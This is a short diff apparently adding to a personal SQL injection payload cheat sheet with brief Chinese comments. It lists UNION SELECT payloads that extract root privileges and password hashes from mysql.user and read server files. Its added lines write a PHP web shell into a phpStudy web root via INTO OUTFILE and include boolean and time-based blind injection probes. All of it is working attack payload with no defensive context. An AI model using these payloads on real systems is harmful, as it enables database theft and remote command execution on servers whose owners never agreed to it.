@@ -25,4 +25,9 @@ ID:'' UNION SELECT 1,2,group_concat(Super_priv) from mysql.user WHERE user='root
 ID:'' UNION SELECT 1,2,group_concat(host,user,password) from mysql.user WHERE Super_priv='Y' --
 ID:'' UNION SELECT 1,2,@@datadir --  //数据库路径
 ID:'' UNION SELECT 1,2,LOAD_FILE('D:\phpStudy\WWW\i.php') --  //读取文件
-
+ID:'' union select 1,2,'<?php system($_GET[cmd]); ?>' into outfile "D:/phpStudy/WWW/i.php" --
+ID:'' union select 1,2,mid(database(),1,1) between 'a' and 'a' --
+ID:'' order by if (1=1,1,sleep(1)) --  时间正常
+ID:'' order by if (1=2,1,sleep(1)) --  时间延迟   
+ID:1 order by rand(true) --
+ID:1 order by rand(false) --
